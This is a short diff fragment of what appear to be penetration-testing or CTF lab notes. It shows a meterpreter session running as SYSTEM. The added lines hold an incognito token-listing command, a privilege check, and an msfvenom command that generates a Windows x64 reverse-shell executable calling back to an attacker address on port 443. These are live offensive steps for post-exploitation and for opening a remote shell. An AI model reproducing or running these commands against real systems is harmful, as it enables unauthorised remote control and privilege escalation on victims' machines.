@@ -26,7 +26,14 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter > 
 
+
+incognito.exe list_tokens -u
+
 whoami /priv
+
+Creating payload:  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.242 LPORT=443 -f exe >rev64.exe
+
+
 
 
 
